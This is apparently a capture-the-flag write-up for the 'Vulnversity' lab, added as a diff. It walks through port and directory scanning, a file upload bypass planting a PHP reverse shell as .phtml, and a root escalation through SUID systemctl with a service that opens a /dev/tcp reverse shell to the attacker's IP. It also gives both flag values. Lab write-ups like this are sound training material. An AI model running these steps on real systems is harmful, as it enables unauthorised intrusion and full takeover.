@@ -1,0 +1,283 @@
+VULNVERSITY.
+
+
+
+
+[>>> TASK 1: DEPLOY THE MACHINE]
+Nothing to do here.
+
+
+
+
+[>>> TASK 2: RECONAISSANCE]
+[2.1. THERE ARE MANY NMAP "CHEATSHEETS" THAT YOU CAN USE TOO.]
+Nothing to do here.
+
+
+
+[2.2. SCAN THE BOX; HOW MANY PORTS ARE OPEN?]
+[ACTION: nmap quick all port scan]
+nmap -sS -T4 -sV -p- 10.10.156.210
+[OUTPUT]
+PORT     STATE SERVICE     VERSION
+21/tcp   open  ftp         vsftpd 3.0.5
+22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+139/tcp  open  netbios-ssn Samba smbd 4
+445/tcp  open  netbios-ssn Samba smbd 4
+3128/tcp open  http-proxy  Squid http proxy 4.10
+3333/tcp open  http        Apache httpd 2.4.41 ((Ubuntu))
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+[ANSWER]
+6
+
+
+
+[2.3. WHAT VERSION OF THE SQUID PROXY IS RUNNING ON THE MACHINE?]
+[ANSWER (based on last output)]
+4.10
+
+
+
+[2.4.HOW MANY PORTS WILL NMAP SCAN IF THE FLAG -p-400 WAS USED?]
+[ANSWER]
+400
+[NOTE]
+-p-x scans from port 1 to port x. 
+
+
+
+[2.5. WHAT IS THE MOST LIKELY OPERATING SYSTEM THIS MACHINE IS RUNNING?]
+[ANSWER (based on 2.2 output)]
+ubuntu
+
+
+
+[2.6. WHAT PORT IS THE WEB SERVER RUNNING ON?]
+[ANSWER (based on 2.2 output)]
+3333
+
+
+
+[2.7. IT'S ESSENTIAL TO ENSURE YOU ARE ALWAYS DOING YOUR RECONAISSANCE THOROUGHLY BEFORE PROGRESSING. KNOWING ALL OPEN SERVICES (WHICH CAN ALL BE POINTS OF EXPLOITATION) IS VERY IMPORTANT, DON'T FORGET THAT PORTS ON A HIGHER RANGE MIGHT BE OPEN, SO CONSTANTLY SCAN PORTS AFTER 1000 (EVEN IF YOU LEAVE CHECKING TO THE BACKGROUND)]
+Nothing to do here.
+
+
+
+[2.8. WHAT IS THE FLAG FOR ENABLING VERBOSE MODE USING NMAP?]
+[ANSWER]
+-v
+
+
+
+
+[>>> TASK 3: LOCATING DIRECTORIES USING GOBUSTER]
+[1.1. I HAVE SUCCESFULLY CONFIGURED GOBUSTER]
+Nothing to do here.
+
+
+
+[1.2. WHAT IS THE DIRECTORY THAT HAS AN UPLOAD FORM PAGE]
+[ACTION: quick gobuster scan for common directories]
+gobuster dir -u http://10.10.156.210:3333 -w /usr/share/seclists/Discovery/Web-Content/common.txt
+[OUTPUT]
+/.htaccess            (Status: 403) [Size: 280]
+/.htpasswd            (Status: 403) [Size: 280]
+/.hta                 (Status: 403) [Size: 280]
+/css                  (Status: 301) [Size: 319] [--> http://10.10.156.210:3333/css/]
+/fonts                (Status: 301) [Size: 321] [--> http://10.10.156.210:3333/fonts/]
+/images               (Status: 301) [Size: 322] [--> http://10.10.156.210:3333/images/]
+/index.html           (Status: 200) [Size: 33014]
+/internal             (Status: 301) [Size: 324] [--> http://10.10.156.210:3333/internal/]
+/js                   (Status: 301) [Size: 318] [--> http://10.10.156.210:3333/js/]
+
+
+[ACTION: visit http://10.10.156.210:3333/internal/]
+We land on a site with a file upload form.
+[ANSWER]
+/internal/
+[NOTE]
+It is clear it wouldn't be /css, /fonts, /images or /js since they store files related to the site setup.
+
+
+
+
+[>>> TASK 4: COMPROMISE THE WEBSERVER]
+[4.1. WHAT COMMON FILE TYPE YOU'D WANT TO UPLOAD TO EXPLOIT THE SERVER IS BLOCKED? TRY A COUPLE TO FIND OUT]
+[NOTE]
+It probably is .php, since it is almost always used to spawn a rev shell in unsanitized file uploads.
+[ANSWER]
+.php
+
+
+
+[4.2. I UNDERSTAND THE BURPSUITE TOOL AND ITS PURPOSE DURING PENTESTING]
+Nothing to do here.
+
+
+
+[4.3. WHAT EXTENSION IS ALLOWED AFTER RUNNING THE ABOVE EXERCISE?]
+[ACTION: download php-reverse-shell.php from https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php]
+
+
+[ACTION: modify shell]
+$ip = '127.0.0.1'; -> $ip = '10.23.25.109';
+$port = 1234; -> $port = 4444;
+[NOTE]
+Port can stay as 1234. 
+But ip needs to be updated to be yours.
+
+
+[ACTION: start listener]
+nc -lnvp 4444
+
+
+[ACTION: change shell extension]
+php-reverse-shell.php -> php-reverse-shell.phtml
+
+
+[ACTION: upload shell to form]
+[OUTPUT]
+Success
+
+
+[ACTION: spawn the shell/execute script]
+Visit: http://10.10.156.210:3333/internal/uploads/php-reverse-shell.phtml
+[OUTPUT]
+$
+[ANSWER]
+.phtml
+
+
+
+[4.4. WHILE COMPLETING THE ABOVE EXERCISE, I HAVE SUCCESFULLY DOWNLOADED THE PHP REVERSE SHELL]
+Nothing to do here.
+
+
+
+[4.5. WHAT IS THE NAME OF THE USER WHO MANAGES THE WEBSERVER?]
+[ACTION: go to home directory and list them]
+cd /home; ls
+[OUTPUT]
+bill 
+ubuntu
+[ANSWER]
+bill
+
+
+[NOTE]
+I forgot, but this should be done as soon as the shell is caught.
+[ACTION: STABILIZE THE SHELL]
+export TERM=xterm
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+CTRL + z
+stty raw -echo; fg
+
+
+
+[4.6. WHAT IS THE USER FLAG?]
+[ACTION: move and check bill's home]
+cd bill; ls
+[OUTPUT]
+user.txt
+
+
+[ACTION: read user flag]
+cat user.txt
+[OUTPUT]
+8bd7992fbe8a6ad22a63361004cfcedb
+
+
+
+
+[>>> TASK 5: PRIVILEGE ESCALATION]
+[5.1. ON THE SYSTEM, SEARCH FOR ALL SUID FILES. WHICH FILE STANDS OUT?]
+[ACTION: check suid binaries]
+find / -perm -4000 -type f 2>/dev/null
+[OUTPUT]
+/usr/bin/newuidmap
+/usr/bin/chfn
+/usr/bin/newgidmap
+/usr/bin/sudo
+/usr/bin/chsh
+/usr/bin/passwd
+/usr/bin/pkexec
+/usr/bin/newgrp
+/usr/bin/gpasswd
+/usr/bin/at
+/usr/lib/snapd/snap-confine
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/bin/su
+/bin/mount
+/bin/umount
+/bin/systemctl
+/bin/fusermount
+/snap/snapd/24505/usr/lib/snapd/snap-confine
+/snap/core20/2582/usr/bin/chfn
+/snap/core20/2582/usr/bin/chsh
+/snap/core20/2582/usr/bin/gpasswd
+/snap/core20/2582/usr/bin/mount
+/snap/core20/2582/usr/bin/newgrp
+/snap/core20/2582/usr/bin/passwd
+/snap/core20/2582/usr/bin/su
+/snap/core20/2582/usr/bin/sudo
+/snap/core20/2582/usr/bin/umount
+/snap/core20/2582/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core20/2582/usr/lib/openssh/ssh-keysign
+/sbin/mount.cifs
+[ACTION]
+it is unusual to see systemctl with suid.
+[ANSWER]
+/bin/systemctl
+
+
+[NOTE]
+To check how to privesc with systemctl, we visit gtfobins (https://gtfobins.github.io/gtfobins/systemctl/).
+The gtfobins methods result unuseful since we don't know www-data's password.
+[ACTION: create script (root.sh) to spawn reverse root shell]
+echo '#!/bin/bash' > /tmp/root.sh; echo 'exec 5<>/dev/tcp/10.23.25.109/1234;cat <&5 | while read line; do $line 2>&5 >&5; done' >> /tmp/root.sh
+
+
+[ACTION: start listener (on attacker)]
+nc -lnvp 1234
+
+[ACTION: make script executable]
+chmod +x /tmp/root.sh
+
+
+[ACTION: create malicious systemd service file]
+cat <<EOF > /tmp/root.service
+[Unit]
+Description=Root Shell
+
+[Service]
+Type=simple
+ExecStart=/tmp/root.sh
+
+[Install]
+WantedBy=multi-user.target
+EOF
+
+
+[ACTION: start service with suid systemctl]
+/usr/bin/systemctl link /tmp/root.service
+/usr/bin/systemctl enable root.service
+/usr/bin/systemctl start root.service
+[OUTPUT]
+connect to [10.23.25.109] from (UNKNOWN) [10.10.156.210] 50038
+
+
+[ACTION: test rev root shell]
+whoami
+[OUTPUT]
+root
+
+
+[ACTION: display root flag]
+cat /root/root.txt
+[OUTPUT]
+a58ff8579f0a9270368d33a9966c7fd5
+
